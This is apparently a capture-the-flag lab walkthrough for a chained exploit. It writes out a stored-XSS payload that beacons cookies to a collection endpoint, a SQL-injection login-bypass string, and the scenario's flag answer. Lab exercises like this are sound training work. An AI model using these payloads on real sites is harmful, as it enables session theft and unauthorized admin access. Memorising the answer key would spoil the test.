# Scenario 12 — Legacy Admin SQLi Bypass + Stored XSS Chain

- **Port:** `8012`
- **Category:** SQL Injection + Cross-Site Scripting (Chained)
- **Difficulty:** Hard
- **Flag:** `CTF{st0r3d_c00k13_th3ft}`

## Walkthrough
1. **Plant Stored XSS Payload:** Post to the public guestbook at `http://<host>:8012/guestbook`:
   `<img src=x onerror="fetch('/xss/collect?c='+encodeURIComponent(document.cookie))">`
2. **SQLi Auth Bypass:** Visit `http://<host>:8012/legacy-admin/login` and log in with username:
   `admin' OR '1'='1' -- -`
   and any password.
3. This sets the non-HttpOnly cookie `admin_session_flag` in your browser.
4. **Trigger Stored XSS Execution:** Navigate to `http://<host>:8012/admin/inbox`. The unescaped payload executes in your authenticated session and beacons your cookies to `/xss/collect`.
5. **Flag Capture:** Visit `http://<host>:8012/xss/collect/log` and extract `CTF{st0r3d_c00k13_th3ft}`.
